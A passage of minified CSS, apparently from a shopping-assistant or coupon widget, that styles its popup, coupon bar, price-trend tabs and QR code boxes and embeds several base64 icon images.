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) center no-repeat}#dai360_link>.dai360_title>span{display:inline-block;vertical-align:1px;font-size:12px}.dai360_title:hover span:nth-child(odd){animation:anim-nanuk-down .5s forwards}@keyframes anim-nanuk-down{0%,100%{transform:translate3d(0,0,0)}50%{transform:translate3d(0,10px,0)}51%{transform:translate3d(0,-10px,0)}}.dai360_title:hover span:nth-child(even){animation:anim-nanuk-up .5s forwards}@keyframes anim-nanuk-up{0%,100%{transform:translate3d(0,0,0)}50%{transform:translate3d(0,-10px,0)}51%{transform:translate3d(0,10px,0)}}#dai360Pop{text-align:center;display:none;position:fixed;width:100%;height:100%;left:0;top:0;z-index:2147483647;font-family:"Microsoft Yahei",serif}#dai360Pop>.shadow{position:absolute;left:0;top:0;right:0;bottom:0;background:rgba(0,0,0,.75)}#dai360Pop>.content{border-radius:20px;width:500px;height:500px;box-sizing:border-box;position:absolute;left:50%;top:50%;margin:-250px 0 0 -250px}#dai360Pop>.content>._close{position:absolute;right:50%;margin-right:-15px;bottom:0;width:30px;height:30px;cursor:pointer;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp4XiDAAAAZlBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+Vn2moAAAAIXRSTlMAu/oRSx0M8XRZJ+2lBz3Dwm713aqek4h5ajLgxdG2gGKXqD5kAAABfUlEQVRIx52W6XaFIAyEw+JVBLu4Vr3bvP9LttLWIyVaD/NPD58yJCShWMr0orFS2kb0RtG/ykYhsZEUY3YMdH5VoUtVVarUhee7fUgNNWRrVLjLVqIeFE9oC7iM+bUDrOaID0BMxGoSwEf0tnJAQbsqAFf9Ia7INR1I57iGjMNc0qHKGS70kQcEy+RbPxrY3RW/StnYOX8G9jc+AwSdksDwE6oa0zlkQv0d6g6OTsqh8z+BzM4imcSydkRLp9Vi9J5M6PF+oVUv85O2MhBESsows+94u6xEHn7Pr/ZcoMvrF7MS79E5G+pREMfwBBXoSUATx/AEaQhqUBLLsASVaMhCEcfcWIIULElUxDC3nUtaQbKI97H44RELxRLF4ofdGGvfO/dnwNoX0CxBPKMhllCyxMrEoTQQPMEzAiZOy9kTK/OI0jJO/uf28fIoo+RPuGIJFzmhXCQUpYTSl1BgE8p4QrNIaEkJjS+hvaY18fRR4XggSRx70oerhBHuE36YJtNdpHYUAAAAAElFTkSuQmCC);background-size:cover}.dypAbs9527-coupon{position:relative;display:flex;align-items:center;height:90px;width:100%;box-sizing:border-box;background:#fff;border:2px solid #F03;border-top:none;border-bottom:1px solid #ddd;z-index:4}.dypAbs9527-coupon-back{margin-left:30px;margin-right:10px;text-align:center;color:#fff;cursor:pointer;box-sizing:border-box;padding-right:60px;width:181px;height:50px;background:url(data:image/png;base64,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)}.dypAbs9527-coupon-arrow{width:24px;height:24px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYBAMAAAASWSDLAAAAD1BMVEUAAAD9JVD9JVD9JVD9JVB7rchjAAAABHRSTlMAgNQV2i+Z6gAAAFNJREFUGNN10NEJwCAMRdFAF3CFrtAJXm33n6khFu5DMX+XIxKNMS1sbo/u9JwWuox0FL01iiL9lkQUKaAMKANag2PAcjXg6/iiBDA9rrfdhwz4AJ64DG/1onh+AAAAAElFTkSuQmCC);margin-left:14px}.dypAbs9527-coupon-back-no{width:50px;height:50px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp4XiDAAAAmVBMVEUAAADKysqbm5ucnJyYmJibm5uhoaGmpqabm5ubm5uampqbm5uXl5enp6eampqZmZn////s7OyXl5eZmZm1tbX09PT/1t7Nzc37+/vo6Oienp6cnJz/7PD/3uXj4+O5ubmwsLCoqKi8vLzr6+vW1tbS0tLHx8fCwsKsrKyhoaH4+Pja2trExMTl5eXh4eHe3t6+vr62tralpaXcuLfUAAAAEHRSTlMA/e5BM/f08OKqnTgbDO6+Mm1SMgAAAa5JREFUSMft0tlygjAUBuAEcNc2JKQJpGWTVahL3//hijPoEVCBmc70ov0vHJPzf0OMoHPWC43eZIOu2dzua4s1qrN+EZxAZisgqxmBcPFyMQtBboOXQJa4MRKLel/jjX051S9Cn8rGiGv1gJJmPjW9Ftpna0SBtMx0udpsVsspiD5CJJ5NJjMsyVAC+YvkGMH3KBxC5JcNC/tLPiXi/MEDfNvBAa9Hd4kXhPhEE9JIQi0cBt6jg9mF2HPSCt+Lwv79S+aWY/HWsodYjDGrtewhTtVxOsvxTxn/W37uxt4/3qp8vHdbMHtGdgNIKzirj1E8OJjRISQ7bne7bclkhxgV0F8nXSJFoFQgrgLI5FVH1MNjbgx7FDE/HUNSnyF6zFliDwN2wvIjRdQ0D2mQp25f303zID2Y5pmcs08yFR7ko7o8hCpL9lURSBUX+8or7ihZeMrHblW5EogtfGVFjf9+F1nKF/a1AgRUfFJ+zOv3OPbVKYY+kFa2sedkwjRF5njxtjEC0lVRmOdhBP0+AvkndwhzxwmXoXk5jpRzZLDSHfGMkhkIGXNGB4fNDfQNVhydk69GKQsAAAAASUVORK5CYII=);margin:0 20px 0 30px}.dypAbs9527-coupon-contact-no{font-size:14px}.dypAbs9527-coupon-contact-no>div{height:22px;line-height:22px}.dypAbs9527-coupon-amount{height:28px;line-height:32px}.dypAbs9527-coupon-amount span{font-size:24px}.dypAbs9527-coupon-price{color:#FD2550;height:32px;line-height:34px}.dypAbs9527-coupon-price span{display:inline-block;height:18px;line-height:18px;font-size:18px;font-weight:700;margin-right:10px;margin-left:4px}.dypAbs9527-coupon-contact-no b,.dypAbs9527-coupon-price b{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAAAWCAMAAABUtyryAAABCFBMVEVb1/Yyselc1/VY1PM0temA//9V1f8xsOgxsOdY1PP///9V0fJT0PI4t+k2tuk0tOgysuda1/UwsOc6uepPzPA8u+pAv+xQzvE+vetNyvBLyO/3/f77/v5Ixu7w+v1Ewu1Cwe150vLP8Ptmz/GA1PLt+f3H7vqu5vij5fdx1fPl9vyp5fee3/VQyO9Hxe5GxO1IwOy76vlWy/DS8fu45/im4vaX3/aK3PV51vNs0fFgy+9Rw+1Nwuzz+/7p+P3d9PvX8vuC2vR00fFszPBbyO/h9fzZ8/vK8Pq/6/my5vii4PaY2/SM1/OH1vJXzvBTxu5EveuN2vR92PNq1fNKx+9Yxe1gzvGR3/Y7voevAAAACXRSTlOIiObm5gYG5uZJZc4dAAACaUlEQVQ4y63PaXOiQBAG4DHJZjft3oIgDGM4RFE88Fa87yNeiWb//z/ZHmSz3xOeKrr6nZ7pKsgncvPrw25wDXmIBCG3/0P8IR7H8i63JB4R8jUiRJIkQRIE6WXJ2PLl2gs5Y+/kOEeS/mSFrCfkchK2ODdyOMe+7UpSc4lN+J4IVw4FRJ0gtKlhj5c1MJbPOOm/Dgt7hp2w6o9bQFVVZUKqpWaFObPRi4BSREkFFhBY8H4/aOzzbitHW61qKguhbEpJNZ28MTaeDRtvtQtNWkDgpJBClECRQoAWlfO5MTrZzhrywzmYSrFaXdWqqIjXTHe1x5c1U+mMx6ZqtFrjIjgKR7RAE0JN7XyuvhYHHQ0mngmvHfwRoCrX0cyMp7X7C9bWtMaAPrehtsgXoaNxpFwqlUtlD0Ie5lLdsz0LJtCBrmJmadM0J/2GqXRZXR/STbmpDtrlEtM1MC2+CN+XSyTNWfDGwrhpFOgT6GBCd2bAIItGUJ+lT/pptdN13doe0mm+CAAXmWmOPHJDeDPEeJhth2nYDHyY6aPJmhnrtXoypo89YBkODniJ6Qfo6nksjxxJcsyGkM0wuqw/TdZXdavRwzRV/WSSdrGrAK/JGfj8zcgFY5S/wCXJEZmrVDIQyFQqPG/UqWypu7yXlOUdc2VZp/y8Apsn5IIvyz6dzyzL0ieAE0TEgAsh95obtq5uxUvGEid9SyyoUBfRERY1o1YbQU8U5fURT3oqxQlHEoFdhs632znN7BJXx0QPK/8qGC5+IjA98ipPxcQ/fi9syLeIkO8RIXc/InFHYj8jESP3sc+/P+xL7P4vsmKdF5BEZTcAAAAASUVORK5CYII=);width:72px;height:22px;cursor:pointer}.dypAbs9527-coupon-price b{vertical-align:-5px}.dypAbs9527-coupon-contact-no b{vertical-align:-6px;margin-left:10px}.dypAbs9527-coupon-time{color:#999}.dypAbs9527-coupon-qr{position:absolute;padding:10px 0;right:12px;width:48px;color:#333;text-align:center;cursor:pointer}.dypAbs9527-coupon-qrIcon{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAMAAAAM7l6QAAAAYFBMVEUAAABFRUVGRkZFRUVFRUVFRUVFRUVERERGRkZFRUVHR0dFRUVRUVFJSUlFRUVJSUlFRUVFRUVbW1tFRUVISEhERERERET///9ERERFRUVFRUVERERFRUVKSkpVVVVEREQGu0XdAAAAH3RSTlMAXUmnZOL5e0KuK8UTDZgVkVUIkyDZwAHQf3jrthgDjfjCdgAAALZJREFUKM+l0dkOwiAQheHTTZQWKktXF97/LW0E4sRIiul/RfhuYAaOVgC1I532ual8Y+QxXDRvruArI5/hu2RyIaWmLKRUhKVzgnLv3DWftRCgPAmhM582lr4l8hou2o2PDbWgWcAWNByroSlAheMCyGZIPI1M7db6hshz23pOTa3/i5Ux+otnY4b0Qn15LLpuojx1ocS+Yxvfua/+8JPzB2A5hyP9+NgOMxoHOGMWmrESUGx9AbSUL+2LYKH8AAAAAElFTkSuQmCC);width:30px;height:30px;margin:4px auto 6px}.dypAbs9527-coupon-qrBox{position:absolute;width:160px;height:218px;display:none;top:70px;left:-56px;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKAAAADaCAMAAAAWqLm4AAAAZlBMVEUAAAD+JlH9JlH/LlL+Nl7+JlH+JVD9JlD/KVT/KFT+JlD/PVz+JlL+JlH+J1L/Nl//JVL/JlH/J1D/M2b////9JVD/6Oz/usj+ZIP/+vv/7/P/09z+cY3+jKP+S2/+kKb+j6X+SW0Eww6wAAAAFHRSTlMA5qYc/u2/jTsh9Ajc2Pd2bWtpCnaG4qsAAAFsSURBVHja7d3bTcNQGAThYzsOBMLdfwh36L9JHDAFrOSHkZip4JO2gG0rd3Pe0O2u9w+N3LbqrIG7rU0VeOTdRT1+1P6yUdvW6/T0zh35rjbP0/SCHfk08DT3WVfMkU8Dz2FHvj8NPEcd+WfgpTfiyMvAvyN/rTny0He1RsvAy8ir1PXD7BtrnZaB/0Zep3FofR0PE7TDsfrWFdY3C6trVRO4KoECowTiEigwTCAugQLDBOISKDBMIC6BAsME4hIoMEwgLoECwwTiEigwTCAugQLDBOISKDBMIC6BAsME4hIoMEwgLoECwwTiEigwTCAugQLDBOISKDBMIC6BAsME4hIoMEwgLoECwwTiEigwTCAugQLDBOISKDBMIC6BAsME4hIoMEwgLoECwwTiEigwTCAugQLDBOISKDBMIC6BAsME4hIoMEwgLoECwwTiEigwTCAugQLD/iUQf5OOP5ofxgI3Dq0NfVfQun5o3xALGu+MFraGAAAAAElFTkSuQmCC)}.dypAbs9527-coupon-qrImg{width:120px;height:120px;margin:28px auto 10px;background:#000}.dypAbs9527-coupon-qrTitle{font-size:14px;text-align:center;height:20px;line-height:20px}.dypAbs9527-coupon-qrTitle span{color:#F03;font-weight:700}#dypMid9527{margin-top:5px;display:flex;background-color:#fff;box-sizing:border-box;font-family:Arial,"Microsoft Yahei",serif!important;font-size:12px;position:relative;z-index:4000;width:480px}.dypMid9527-title{position:relative;z-index:1000;height:30px;line-height:30px;cursor:pointer;font-size:14px;color:#333;text-align:center}.dypMid9527-borderMask{position:absolute;height:0;border-bottom:1px solid #ddd;width:100%;z-index:10000;bottom:-1px}.dypMid9527-box{position:absolute;border:2px solid #F03;border-top:none;top:33px;display:none;background-color:#fff;z-index:999}.dypMid9527-active,.dypMid9527-buyers-show,.dypMid9527-coupon,.dypMid9527-feast,.dypMid9527-must-see,.dypMid9527-phone,.dypMid9527-price-trend,.dypMid9527-same{flex:1;border:2px solid #F03;border-right:1px solid #ddd;border-bottom:1px solid #ddd;border-left:none}.dypMid9527-buyers-show,.dypMid9527-must-see{display:none}.dypMid9527-box-phone{width:172px;right:32px;height:230px;text-align:center;padding-top:12px;border:1px solid #ddd;border-top:none}.dypMid9527-phone-qr,.dypMid9527-phone-qr img{width:130px;height:130px}.dypMid9527-phone-qr{margin:0 auto 10px}#dypMid9527-phone-qr{margin:3px auto}.dypMid9527-box-phoner{color:#FD2550;font-size:16px;font-weight:700;line-height:24px}.dypMid9527-box-phonet{color:#333;font-size:14px}.dypMid9527-setting{border:2px solid #F03;border-radius:0 4px 0 0;border-left:none;border-bottom:1px solid #ddd}.dypMid9527-setting-title{width:30px}.dypMid9527-setting-title b{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAYAAAA71pVKAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjI2MDJBNzhCOTM4OTExRTc5RkM3RTUxMEJEMkJEMTVFIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjI2MDJBNzhDOTM4OTExRTc5RkM3RTUxMEJEMkJEMTVFIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MjYwMkE3ODk5Mzg5MTFFNzlGQzdFNTEwQkQyQkQxNUUiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MjYwMkE3OEE5Mzg5MTFFNzlGQzdFNTEwQkQyQkQxNUUiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7iTlRZAAACU0lEQVR42kyTT0jTYRjHf3/e/bb9fpvpICeRbd0cgzTSQhEPQlKWEAjd6iDFosCDgR06mIQYBHbo0iHo4slCxBDqEBok6KFJBCUdFs2IwIrSrf3f+jxjiw0e3ud93u/3+3zf99lPj0Qimq7r1ZBfpVKR/LZhGEPkH8mj5XL5BfmMYOScsyrWqJPqv1wu1wL4HKArxDXiKvtR6s2NWMnNQCAgSoPEY2onTNOMsT6F8FIppRWLxR8ALfI71DvJJ4kE50k9HA47Pp9vicI8kSuVSp+y2WwckYNer/d4JpPZorbr8XhO0eAoAj7cXEylUud17nwP0h8Ks3TRUNRcLtctyD3U/1K3IW/m8/n7YtWyLLE8Rd00AInV/UKhoKXTaTm46Xa7h+gwgdBlWREbwfa4CEsDHPwmug0IYxSHAUQdx7EgDtDpAsrJ2tskyUexPcj1FJ2PgT8LL6ZQ2iHec9gHMQ3xK7HfOAHc7EL4gkgAl/3g31LbMbAToms3o1jnEb4BOoylpkYypFbAIYi/EN6gexdxyLBtW0a0RPEDL5tH5DXkZ4CP1Lgh8gUm8AqrRcTjdF5F6JFiIxYcmanf75cHmUPAZP8AkRTnNo/5nPUhhKoauYzrnaLb3dqcvxNZANsyFgitvEMnQnHwP5n5ScTaIR5g38sVR8xgMFiQy1O4jppDfgmQSf6GNcGawUWM9YbMnPMzYKepJZRYobhGYU3+BNy9DdIKh6vUPvMwHVxlDDencbJXf0ThKflKGn8Qxf4y6RNim4iyX2Qie7Uv7v/X90+AAQBd7VgLYC5SIQAAAABJRU5ErkJggg==);display:inline-block;width:15px;height:15px;margin-top:8px}.dypMid9527-box-setting{width:53px;border:1px solid #ddd;border-right:none;right:2px;top:32px}.dypMid9527-box-setting li{text-align:center;height:25px;line-height:25px;cursor:pointer;color:#505050}.dypMid9527-box-setting li:hover{background-color:#f5f5f5}.dypMid9527-logo{height:33px;border:none}.dypMid9527-logo a{display:inline-block;border-radius:4px 0 0;width:32px;height:33px}.dypBot9527-icon,.dypMid9527-logo a{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAABC1BMVEX/////IU74JlP/H0z7IlH/9Pb7M138KVj6JFT2DUH+JlX0Azb7OFz2REf2Cjz/+/z3J1D5H1D3FEf6PFj4K1H4I1H1BDr2N0D1GTn0EDf9LVr3K0v7MFn+I1H4GUz3Mkn4I1T4Q0/2PkP1MD31ITv5QVj4RFX2O0n2GkH1FD31KDv0Cjf/6Oz/4ej7QWj4M1D5HE/3L072I0T3EET+q739jKP8T3T7Jlf1NUT/7fD8dpD6PV34L1L3R033OE33QEz3H0r2Pkf+zNb9xM38tLz9nLH9orD4Y2/9SW72K0H/9vf/0dr9h5/9e5j6VnH5TGb4P1H/2uH7kab8kaD5h478aoj6WX75Znv+HEmYbDVyAAAB50lEQVQ4y22TCXOaUBRGbykoWhPASNOoKNatNYJJA7gmqUtcsnfv//8l/d59UOo0x9F5cg533rDQ79f7WKqqWpZt267r2rZikTz8CogfFei6oiiuIrHTAKQB/P+Bik8cgDTYH7EfmC8EOki9iUDurxD0tZj1VtP6K58L00QgyPfpLz9CAlpGKZXS4CGWhkGa7/Hya+nf4C72+N74xHglQYXY+8npILpHJ3gszc7PK3JCyJ4E40yynfUsCRzH49OZMEri8WDAgeM4W0rZ3lDCr8Ggjj0gCFIfVNP18u